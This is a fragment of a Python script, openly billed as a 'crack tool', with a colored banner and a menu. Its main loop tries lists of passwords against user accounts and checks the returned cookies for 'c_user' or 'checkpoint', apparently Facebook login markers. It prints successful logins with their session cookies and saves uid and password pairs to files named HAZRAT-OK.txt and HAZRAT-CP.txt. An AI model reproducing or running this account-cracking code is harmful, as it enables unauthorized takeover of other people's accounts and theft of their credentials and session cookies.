#---------------------[BM-KARWAN]---------------------#
#hazrat AND MURTAZA IS THE BEST OF THE CRACK TOOLS SYESTUM#
...
try:
        ...
        os.system('python hazrat_mix.py')  
...
\033[1;31       88ooo88        88,8P      88    88V8o 88 88      
       88~~~88 C8888D 88`8b      88    88 V8o88 88  ooo 
\033[1;37       88   88        88 `88.   .88.   88  V888 88. ~8~ 
       YP   YP        YP   YD Y888888P VP   V8P  Y888P  
\033[1;34m════════════════════════════════════════════════
        \033[1;36mCREATED BY   :  RAYEES HAZRAT
...
def hazrat():
    os.system('clear')
    print(logo)
    print(' [1] CREATE FILE \33[1;32m(RH KING)\33[1;37m')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HAZRAT-OK] '+uid+' | '+ps+' \n\033[1;33m COOKIE = \033[1;36m'+coki+  '  ''  \033[0;97m');print(53*'\033[1;37m═')
                open('HAZRAT-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('[HAZRAT-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('HAZRAT-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;32m[HAZRAT] %s| [OK:- %s] \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
